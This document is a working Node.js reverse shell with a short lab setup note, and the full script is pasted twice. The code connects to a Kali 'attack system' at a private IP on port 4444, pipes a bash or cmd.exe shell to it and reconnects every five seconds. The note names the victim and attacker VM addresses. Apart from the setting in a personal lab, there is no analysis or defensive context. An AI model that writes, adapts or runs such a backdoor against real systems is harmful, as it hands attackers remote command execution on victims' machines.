const net = require('net');
const { spawn } = require('child_process');

// Configuration - Attack system IP
const HOST = '192.168.217.139';  // Kali attack system IP
const PORT = 4444;

function createReverseShell() {
    const client = new net.Socket();
    
    client.connect(PORT, HOST, () => {
        console.log('Connected to remote host');
        
        // Determine shell based on OS
        const shell = process.platform === 'win32' ? 'cmd.exe' : '/bin/bash';
        const shellProcess = spawn(shell, [], {
            stdio: ['pipe', 'pipe', 'pipe']
        });
        
        // Pipe shell output to client
        shellProcess.stdout.pipe(client);
        shellProcess.stderr.pipe(client);
        
        // Pipe client input to shell
        client.pipe(shellProcess.stdin);
        
        // Handle disconnection
        client.on('close', () => {
            console.log('Connection closed');
            shellProcess.kill();
            process.exit(0);
        });
        
        shellProcess.on('close', () => {
            client.destroy();
        });
    });
    
    client.on('error', (err) => {
        console.error('Connection error:', err.message);
        setTimeout(createReverseShell, 5000); // Retry after 5 seconds
    });
}

// Start the reverse shell
createReverseShell();


## Network Configuration Summary:
- **Victim VM (Target)**: 192.168.217.143
- **Attack System (Kali)**: 192.168.217.139


## Step 1: Update Scripts with Correct IP Addresses

### Update reverse_shell.js for the victim system:
```javascript
const net = require('net');
const { spawn } = require('child_process');

// Configuration - Attack system IP
const HOST = '192.168.217.139';  // Kali attack system IP
const PORT = 4444;

function createReverseShell() {
    const client = new net.Socket();
    
    client.connect(PORT, HOST, () => {
        console.log('Connected to remote host');
        
        // Determine shell based on OS
        const shell = process.platform === 'win32' ? 'cmd.exe' : '/bin/bash';
        const shellProcess = spawn(shell, [], {
            stdio: ['pipe', 'pipe', 'pipe']
        });
        
        // Pipe shell output to client
        shellProcess.stdout.pipe(client);
        shellProcess.stderr.pipe(client);
        
        // Pipe client input to shell
        client.pipe(shellProcess.stdin);
        
        // Handle disconnection
        client.on('close', () => {
            console.log('Connection closed');
            shellProcess.kill();
            process.exit(0);
        });
        
        shellProcess.on('close', () => {
            client.destroy();
        });
    });
    
    client.on('error', (err) => {
        console.error('Connection error:', err.message);
        setTimeout(createReverseShell, 5000); // Retry after 5 seconds
    });
}

// Start the reverse shell
createReverseShell();